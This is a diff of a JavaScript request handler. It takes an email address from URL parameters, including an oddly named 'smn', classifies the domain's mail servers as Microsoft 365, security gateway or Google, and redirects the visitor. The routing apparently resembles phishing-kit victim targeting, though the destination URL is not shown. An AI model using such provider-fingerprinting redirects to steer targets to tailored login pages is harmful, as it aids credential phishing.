@@ -30,7 +30,6 @@ function extractEmail(req) {
     email = Array.isArray(req.query.email)
       ? req.query.email[0]
       : req.query.email;
-
   else if (req.query?.smn)
     email = Array.isArray(req.query.smn)
       ? req.query.smn[0]
@@ -39,25 +38,41 @@ function extractEmail(req) {
   return typeof email === "string" ? email.trim().toLowerCase() : "";
 }
 
+/**
+ * IMPORTANT:
+ * - Office-likely MUST outrank Google
+ * - Google detection MUST be strict
+ */
 function classifyMx(exchanges) {
-  const mx = exchanges.join(" ");
+  const joined = exchanges.join(" ");
 
-  if (mx.includes("mail.protection.outlook.com"))
+  /* 1️⃣ Office DEFINITE */
+  if (joined.includes("mail.protection.outlook.com"))
     return "office_definite";
 
+  /* 2️⃣ Office LIKELY (enterprise gateways) */
   if (
-    mx.includes("pphosted.com") ||
-    mx.includes("mimecast.com") ||
-    mx.includes("barracudanetworks.com") ||
-    mx.includes("arsmtp.com") ||
-    mx.includes("iphmx.com") ||
-    mx.includes("messagelabs.com") ||
-    mx.includes("forcepoint.com") ||
-    mx.includes("sophos.com")
+    joined.includes("pphosted.com") ||
+    joined.includes("mimecast.com") ||
+    joined.includes("barracudanetworks.com") ||
+    joined.includes("arsmtp.com") ||
+    joined.includes("iphmx.com") ||
+    joined.includes("messagelabs.com") ||
+    joined.includes("forcepoint.com") ||
+    joined.includes("sophos.com")
   )
     return "office_likely";
 
-  if (mx.includes("google.com"))
+  /* 3️⃣ Google DEFINITE (STRICT only) */
+  if (
+    exchanges.some(mx =>
+      mx === "aspmx.l.google.com" ||
+      mx.startsWith("alt1.aspmx.l.google.com") ||
+      mx.startsWith("alt2.aspmx.l.google.com") ||
+      mx.startsWith("alt3.aspmx.l.google.com") ||
+      mx.startsWith("alt4.aspmx.l.google.com")
+    )
+  )
     return "google_definite";
 
   return "other";
@@ -158,4 +173,3 @@ export default async function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
-
